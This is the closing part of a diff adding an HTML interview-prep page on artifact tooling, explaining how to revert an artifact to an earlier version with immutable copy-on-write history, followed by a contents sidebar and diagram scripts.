+          <div class="cancel-chain">
+            <span class="cancel-step">PING timeout</span><span class="cancel-arrow">→</span>
+            <span class="cancel-step">Hang detected</span><span class="cancel-arrow">→</span>
+            <span class="cancel-step">iframe.remove()</span><span class="cancel-arrow">→</span>
+            <span class="cancel-step">Restore v−1</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="qa" id="revert-version">
+        <h3 class="question">How do you implement a "revert to version N" for an artifact?</h3>
+        <p><strong>Data model:</strong> Immutable versions; revert does not delete vN+1…vM—it creates <strong>vM+1</strong> whose content equals vN (preferred) or moves a <code>head</code> pointer (simpler, loses forward history visibility).</p>
+        <p><strong>Preferred flow (copy-on-write):</strong></p>
+        <ol>
+          <li>User selects version N in timeline → “Restore this version”.</li>
+          <li>Server/client creates <code>version = M+1</code>, <code>parent = currentHead</code>, <code>content = copy(versions[N].content)</code>, <code>author = user</code>, <code>revertedFrom = N</code>.</li>
+          <li>Editor buffer replaces with restored content; preview compiles with <code>version M+1</code>.</li>
+          <li>Chat optional system line: “Restored artifact to v3 (snapshot from 10:42).”</li>
+        </ol>
+        <p><strong>Pointer-only flow:</strong> <code>artifacts.head_version = N</code>—fast but hides newer versions from default UI unless you show “future versions discarded” warning.</p>
+        <p><strong>Conflict rules:</strong> If Claude streams a new version while user reverts, <code>baseVersion</code> check rejects silent overwrite; show merge dialog. <strong>Undo revert:</strong> Because history is linear/immutable, “undo” is just another restore to pre-revert version.</p>
+        <p><strong>Permissions:</strong> Revert is a user action; audit log stores <code>revertedFrom</code>. For collaborative artifacts, broadcast revert via CRDT/WebSocket so all clients jump to the new head.</p>
+        <p class="tradeoff"><strong>Tradeoff:</strong> Copy-on-write uses more storage but matches user mental model (“I went back”) and keeps forward history for forensics; essential for interview discussion of Claude-style document tools.</p>
+        <div class="demo-panel" data-demo="decision-tree" data-tree='{"question":"User clicks Restore version N — which model?","options":[{"label":"Copy-on-write: new vM+1 with content from vN","result":"PREFERRED — immutable history, forward versions preserved for forensics."},{"label":"Pointer-only: move head_version to N","result":"Simpler — hides newer versions unless you warn about discarded forward history."},{"label":"Delete versions N+1…M","result":"Avoid — destroys audit trail; copy-on-write or fork-as-new-artifact instead."}]}'>
+          <p class="demo-panel-title">Try it: revert strategy decision tree</p>
+          <div class="decision-tree"><div data-tree-root></div><div class="decision-result"></div></div>
+        </div>
+      </article>
+
+      <p class="doc-footer">Section 4 complete — Core (5) + Deep (6) questions.</p>
+    </main>
+
+    <aside class="toc-sidebar">
+      <nav class="toc-panel" aria-label="Table of contents">
+        <h2>Contents</h2>
+        <ol>
+          <li><a href="#safely-render">Safely render HTML or React</a></li>
+          <li><a href="#iframe-sandbox">Iframe sandbox attacks</a></li>
+          <li><a href="#stream-live-reload">Stream code &amp; live reload</a></li>
+          <li><a href="#postmessage"><code>postMessage</code> bridge</a></li>
+          <li><a href="#version-artifacts">Version artifacts</a></li>
+          <li><a href="#csp-headers">CSP on sandboxed iframe</a></li>
+          <li><a href="#cdn-imports">External CDN imports</a></li>
+          <li><a href="#diff-versions">Diff &amp; visual changelog</a></li>
+          <li><a href="#sync-scroll">Sync editor &amp; preview scroll</a></li>
+          <li><a href="#infinite-loop">Infinite loop handling</a></li>
+          <li><a href="#revert-version">Revert to version N</a></li>
+        </ol>
+      </nav>
+    </aside>
+  </div>
+
+  <footer class="site-footer">
+    <a href="index.html">← All sections</a>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    mermaid.initialize({
+      startOnLoad: false,
+      theme: 'neutral',
+      securityLevel: 'loose',
+      flowchart: { useMaxWidth: true, htmlLabels: true }
+    });
+  </script>
+  <script src="assets/interactive.js" defer></script>
+</body>
+</html>
